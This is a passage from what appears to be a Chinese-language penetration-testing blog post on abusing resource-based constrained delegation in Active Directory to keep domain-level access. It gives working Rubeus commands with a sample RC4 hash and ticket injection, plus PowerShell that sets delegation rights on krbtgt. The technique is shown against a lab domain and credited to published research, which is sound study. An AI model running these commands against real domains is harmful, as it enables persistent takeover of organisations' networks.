+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:cifs/dm2008 /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:host/dm2008 /ptt</span><br></pre></td></tr></tbody></table></figure>
+<p>如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200321221956-0a63ac3c-6b7f-1.gif" alt="gif" title="">
+                </div>
+                <div class="image-caption">gif</div>
+            </figure>
+<h2 id="利用基于资源的约束委派进行域权限维持"><a href="#利用基于资源的约束委派进行域权限维持" class="headerlink" title="利用基于资源的约束委派进行域权限维持"></a>利用基于资源的约束委派进行域权限维持</h2><p>这个就不用我多说了，上面的过程能理解的话这应该可以理解，主要有两种方法：</p>
+<ol>
+<li>配置evilsystem到krbtgt基于资源的约束委派</li>
+<li>配置evilsystem到域控基于资源的约束委派</li>
+</ol>
+<p>这里就以第一种方法为例，下面配置evilsystem到krbtgt基于资源的约束委派</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)"</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Set-DomainObject krbtgt -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322120649-8ded17e6-6bf2-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>尝试是否可以请求到TGT</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:krbtgt /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322121221-537cc45c-6bf3-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>然后利用<code>S4U2proxy</code>返回的TGT去申请一张访问域控cifs服务的ST</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs /user:evilsystem$ /enctype:rc4 /service:cifs/dm2012 /domain:test.local /ticket:test.kirbi /ptt</span><br></pre></td></tr></tbody></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322121915-4acf27b8-6bf4-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>Rubeus一个一个请求票据有点小麻烦，直接用impacket套件会快一点</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322122903-a93703b0-6bf5-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>成功达到了域权限维持的效果</p>
+<p>下面展示Rubeus和impacket套件两种方法的利用的过程：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200322170851-bf5fe892-6c1c-1.gif" alt="gif" title="">
+                </div>
+                <div class="image-caption">gif</div>
+            </figure>
+<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>更多的利用场景可以参考<code>Elad Shamir</code>的那篇文章。最后，非常感谢<code>Elad Shamir</code>以及A-Team分享的文章，学到很多</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" target="_blank" rel="noopener">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></p>
+<p><a href="http://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/" target="_blank" rel="noopener">A Case Study in Wagging the Dog: Computer Takeover</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483689&amp;idx=1&amp;sn=1d83538cebbe2197c44b9e5cc9a7997f&amp;chksm=eaa5bb09ddd2321fc6bc838bc5e996add511eb7875faec2a7fde133c13a5f0107e699d47840c&amp;scene=126&amp;sessionid=1584603915&amp;key=cf63f0cc499df801cce7995aeda59fae16a26f18d48f6a138cf60f02d27a89b7cfe0eab764ee36c6208343e0c235450a6bd202bf7520f6368cf361466baf9785a1bcb8f1965ac9359581d1eee9c6c1b6&amp;ascene=1&amp;uin=NTgyNDEzOTc%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A8KlWjR%2F8GBWKaJZTJ2e5Fg%3D&amp;pass_ticket=B2fG6ICJb5vVp1dbPCh3AOMIfoBgH2TXNSxmnLYPig8%3D" target="_blank" rel="noopener">微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-03-23T02:04:39.468Z" itemprop="dateUpdated">2020-03-23 10:04:39</time>
+</span><br>
+
+
+        
+        know it then hack it
+        
+    </div>
+    
+    <footer>
+        <a href="https://byqiyou.github.io">
+            <img src="/img/avatar.jpg" alt="">
+            
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/">pentest</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/&title=《域渗透——基于资源的约束委派利用》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/&title=《域渗透——基于资源的约束委派利用》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《域渗透——基于资源的约束委派利用》 — 七友&url=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/02/29/利用BloodHound分析域中的攻击路径/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">利用BloodHound分析域中的攻击路径</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'true';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+<section class="comments" id="comments">
+    <!-- UY BEGIN -->
+    <div id="uyan_frame"></div>
+    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
+    <!-- UY END -->
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        Thinks
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/2.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/2.png" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span> &copy; 2018 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/&title=《域渗透——基于资源的约束委派利用》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/&title=《域渗透——基于资源的约束委派利用》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《域渗透——基于资源的约束委派利用》 — 七友&url=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://byqiyou.github.io/2020/03/23/域渗透——基于资源的约束委派利用/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'Leave';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'Come back';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
